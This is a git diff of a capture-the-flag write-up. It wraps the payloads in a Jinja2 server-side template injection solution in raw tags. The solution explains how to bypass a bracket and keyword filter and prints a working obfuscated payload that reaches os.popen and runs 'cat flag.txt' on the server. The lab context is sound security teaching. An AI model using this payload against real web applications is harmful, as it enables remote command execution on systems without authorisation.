@@ -158,11 +158,11 @@ if __name__ == "__main__":
     app.run(host='0.0.0.0')
 ```
 
-- [x] Solution : By reading the code i can tell it's an SSTI, but not the usual injection which uses `{{ }}` for Expressions to print to the template output, cuz brackets are filtered so i tried `{{ "{% ... " }}%}` for Statements, like when i used `{{ "{% set v=6/2 " }}%}` works fine but when i tired `{{ "{% set v=6/0 " }}%}` gives back error, so this will be our entry : bypass `.` with `|` and bypass filtred functions by hexify those keywords like `\x5f` gives `_` and so on ...
+- [x] Solution : By reading the code i can tell it's an SSTI, but not the usual injection which uses `{{ }}` for Expressions to print to the template output, cuz brackets are filtered so i tried `{% raw  %} {% ... %} {% endraw %}` for Statements, like when i used `{% raw  %} {% set v=6/2 %} {% endraw %}` works fine but when i tired `{% raw  %} {% set v=6/0 %} {% endraw %}` gives back error, so this will be our entry : bypass `.` with `|` and bypass filtred functions by hexify those keywords like `\x5f` gives `_` and so on ...
 
 ```python
 # cat flag.txt : \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74
-{%print(lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f'))|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74')|attr('read')()%}
+{% raw %} {%print(lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f'))|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74')|attr('read')()%} {% endraw %}
 ```
 
 ### b4D h4ck3R <Badge type="danger">Hard</Badge>
